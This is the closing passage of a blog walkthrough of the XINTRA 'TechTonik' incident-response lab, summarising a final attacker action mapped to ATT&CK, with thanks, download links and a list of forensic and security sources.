<p>We observe the attacker‚Äôs IP <code class="language-plaintext highlighter-rouge">44.222.89[.]156</code> creating a new user (<code class="language-plaintext highlighter-rouge">user id 22</code>) shortly after at <code class="language-plaintext highlighter-rouge">2024/05/31 11:55:06</code> and uploading the same plugin as we documented above. We did not observe the attacker retrieving the archive from the web server, but given the effort in moving <code class="language-plaintext highlighter-rouge">DocsBackup.rar</code> to <strong><code class="language-plaintext highlighter-rouge">TTK-DEV-01</code></strong>, it is possible they might retrieve it via an internet-facing directory at a later date. As a result we have marked ‚ÄúExfiltration Over Web Service (T1567)‚Äù in the ATT&amp;CK Navigator Layer.</p>

<h1 id="our-grizzly-end">
<a class="anchor" href="#our-grizzly-end" aria-hidden="true"><span class="octicon octicon-link"></span></a>Our Grizzly End</h1>

<p>So that‚Äôs it! over 9000 words and a few too many bear puns later, I‚Äôm glad to have written this- even though it took much longer than the actual investigation. The walkthrough gave me the opportunity to think and re-think my approach and assumptions, and then correct these gaps in my reasoning. It was also really cool to see the attacks and TTPs show up in the logs, something as simple as lateral movement over RDP leaves several clues.</p>

<p>A big thanks to <a href="https://x.com/XintraOrg">@XintraOrg</a>, <a href="https://x.com/InverseCos">@InverseCos</a>, adversarial emulator <a href="https://twitter.com/ZephrFish">@ZephrFish</a> and incident responder <a href="https://x.com/svch0st">@svch0st</a> who made this a blast to solve.</p>

<p>A big thank you to my <strong>editors</strong> (you know who you are!) who really helped me with my first post. You‚Äôre the best!</p>

<p>Feel free to reach out if you want to chat DFIR or if you have any questions!</p>

<h3 id="downloads">
<a class="anchor" href="#downloads" aria-hidden="true"><span class="octicon octicon-link"></span></a>Downloads</h3>

<ol>
  <li>
    <p><a href="/spellzedblog/assets/downloads/techtonik-ir-tracker.xlsx" download="">
  <img src="/spellzedblog/assets/downloads/techtonik-ir-tracker.xlsx" alt="IR Tracker">
</a></p>
  </li>
  <li>
    <p><a href="/spellzedblog/assets/downloads/techtonik-layer.json" download="">
  <img src="/spellzedblog/assets/downloads/techtonik-layer.json" alt="Mitre Attack navigator layer">
</a></p>
  </li>
</ol>

<h1 id="sources">
<a class="anchor" href="#sources" aria-hidden="true"><span class="octicon octicon-link"></span></a>Sources</h1>

<p>Memes generated at <a href="https://imgflip.com/memegenerator">Meme Generator - ImgFlip</a></p>

<p>Hashes checked at <a href="https://www.virustotal.com">VirusTotal</a></p>

<p>Linked articles in order of appearance:</p>
<ol>
  <li><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-347a">Russian Foreign Intelligence Service (SVR) Exploiting JetBrains TeamCity CVE Globally | CISA</a></li>
  <li><a href="https://tclahr.github.io/uac-docs/">Getting Started - UAC Documentation</a></li>
  <li><a href="https://www.crowdstrike.com/en-us/blog/crowdstrike-releases-digital-forensics-and-incident-response-tracker/">CrowdStrike Services Releases Free Incident Response Tracker</a></li>
  <li><a href="https://www.rapid7.com/blog/post/2024/03/04/etr-cve-2024-27198-and-cve-2024-27199-jetbrains-teamcity-multiple-authentication-bypass-vulnerabilities-fixed/">JetBrains TeamCity Multiple Authentication Bypass Vulnerabilities | Rapid7 Blog</a></li>
  <li><a href="https://github.com/peass-ng/PEASS-ng">GitHub - peass-ng/PEASS-ng: PEASS - Privilege Escalation Awesome Scripts SUITE (with colors)</a></li>
  <li><a href="https://artefacts.help/linux_wget_hsts_history.html">‚Äúwget HSTS history | artifacts.help‚Äù</a></li>
  <li><a href="https://www.baeldung.com/linux/network-drive-etc-fstab">Error fetching URL: 403 Client Error: Forbidden for url: https://www.baeldung.com/linux/network-drive-etc-fstab</a></li>
  <li><a href="https://krebsonsecurity.com/2023/08/tourists-give-themselves-away-by-looking-up-so-do-most-network-intruders/">Tourists Give Themselves Away by Looking Up. So Do Most Network Intruders. ‚Äì Krebs on Security</a></li>
  <li><a href="https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md">PEASS-ng/winPEAS/winPEASexe/README.md at master ¬∑ peass-ng/PEASS-ng ¬∑ GitHub</a></li>
  <li><a href="https://www.magnetforensics.com/blog/shimcache-vs-amcache-key-windows-forensic-artifacts/">ShimCache vs AmCache: Key Windows Forensic Artifacts - Magnet Forensics</a></li>
  <li><a href="https://threathunterplaybook.com/hunts/windows/170105-LSASSMemoryReadAccess/notebook.html">LSASS Memory Read Access ‚Äî Threat Hunter Playbook</a></li>
  <li><a href="https://github.com/jpillora/chisel">GitHub - jpillora/chisel: A fast TCP/UDP tunnel over HTTP</a></li>
  <li><a href="https://vulmon.com/exploitdetails?qidtp=exploitdb">Vulmon - Vulnerability Intelligence Search Engine</a></li>
  <li><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers">Security identifiers | Microsoft Learn</a></li>
  <li><a href="https://learn.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard?tabs=intune">Remote Credential Guard | Microsoft Learn</a></li>
  <li><a href="https://www.blumira.com/blog/2024-apr-why-are-threat-actors-enabling-windows-restrictedadmin-mode">Why are Threat Actors enabling Windows Restricted Admin mode?</a></li>
  <li><a href="https://github.com/wavestone-cdt/EDRSandblast/blob/master/README.md">EDRSandblast/README.md at master ¬∑ wavestone-cdt/EDRSandblast ¬∑ GitHub</a></li>
  <li><a href="https://github.com/wavestone-cdt/EDRSandblast">GitHub - wavestone-cdt/EDRSandblast</a></li>
  <li><a href="https://github.com/GhostPack/SharpDPAPI?tab=readme-ov-file#sharpchrome">GitHub - GhostPack/SharpDPAPI: SharpDPAPI is a C# port of some Mimikatz DPAPI functionality.</a></li>
  <li><a href="https://simulandlabs.com/labs/GoldenSAML/README.html">Golden SAML ‚Äî SimuLand</a></li>
  <li><a href="https://learn.microsoft.com/en-us/defender-for-identity/deploy/configure-windows-event-collection#configure-domain-object-auditing">Configure audit policies for Windows event logs - Microsoft Defender for Identity | Microsoft Learn</a></li>
  <li><a href="https://mitre-attack.github.io/attack-navigator/">https://mitre-attack.github.io/attack-navigator/</a></li>
</ol>



  <small>tags: <em>walkthrough,</em> - <em>XINTRA</em> - <em>Labs,</em> - <em>TechTonik</em></small>


      </section>
    </div>
  </body>
</html>
